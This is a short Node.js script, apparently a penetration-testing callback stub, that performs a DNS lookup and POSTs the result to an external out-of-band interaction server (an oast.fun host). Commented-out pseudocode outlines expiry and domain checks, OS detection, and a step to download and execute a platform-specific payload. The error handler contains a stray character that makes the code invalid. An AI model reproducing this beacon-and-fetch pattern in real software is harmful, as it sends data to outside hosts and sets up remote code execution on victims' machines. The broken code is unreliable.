#!/usr/bin/env node

const dns = require('dns');
const http = require('http');

const domain = 'google.com'; // Domain to perform DNS lookup on
// modify with call back server
const serverUrl = 'http://jouzjhqaabhhbfjsprdmwk0hu2gqdlf7l.oast.fun'; // URL of the server endpoint

// Perform DNS lookup
dns.resolve(domain, (err, addresses) => {
  if (err) {
    console.error(`Error resolving DNS for ${domain}: ${err.message}`);
    return;
  }

  const dnsResult = addresses.join('\n');

  // Send DNS result to server
  const postData = JSON.stringify({ dnsResult });
  const options = {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(postData)
    }
  };

  const req = http.request(serverUrl, options, (res) => {
    console.log(`Status code: ${res.statusCode}`);
  });

  req.on('error', (error) => {a
    console.error('Error sending DNS result to server:', error);
  });

  req.write(postData);
  req.end();
});


// // variables
// var expiration_date = x;
// var in_scope_domain= google.com;
// var hostOS = unknown;




// // check date of engagement if older than current day ie expires, quit
// var today = new Date();
// var engagementDate = new Date(expiration_date);
// if (engagementDate < today) {
//     return;
// }
// // check domain resolves, if it des not resolve quit





// // check host OS

//     // if windows set download link to link1

//     // if linux set download link to link2

// // download and execute from the link 